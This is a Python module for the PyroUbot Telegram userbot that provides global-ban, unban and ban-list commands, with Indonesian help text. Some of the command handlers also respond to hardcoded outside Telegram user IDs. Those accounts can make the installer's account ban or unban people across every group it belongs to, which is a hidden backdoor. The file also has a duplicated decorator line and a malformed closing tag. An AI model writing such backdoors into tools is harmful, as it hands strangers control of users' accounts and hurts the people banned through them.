from PyroUbot import *

__MODULE__ = "global"
__HELP__ = f"""
<b>『 ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ɢʟᴏʙᴀʟ 』</b>

  <b>• ᴘᴇʀɪɴᴛᴀʜ:</b> <code>gban</ᴄᴏᴅᴇ> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>• ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ 

  <b>• ᴘᴇʀɪɴᴛᴀʜ:</b> <code>ungban</code> [ᴜsᴇʀ_ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ]
  <b>• ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴜɴʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ

  <b>• ᴘᴇʀɪɴᴛᴀʜ:</b> <code>listgban</code>
  <b>• ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴅᴀꜰᴛᴀʀ ᴘᴇɴɢɢᴜɴᴀ ɢʙᴀɴ.
"""


@PY.UBOT("gban", sudo=True)
@PY.TOP_CMD
@ubot.on_message(filters.command(["gban"], "C") & filters.user(6588255955))
@ubot.on_message(filters.command(["gban"], "C") & filters.user(6588255955))
async def _(client, message):
    await global_banned(client, message)


@PY.UBOT("ungban", sudo=True)
@PY.TOP_CMD
@ubot.on_message(filters.command(["ungban"], "C") & filters.user(2100442624))
@ubot.on_message(filters.command(["ungban"], "C") & filters.user(5312739535))
async def _(client, message):
    await cung_ban(client, message)


@PY.UBOT("listgban", sudo=True)
@PY.TOP_CMD
async def _(client, message):
    await gbanlist(client, message)
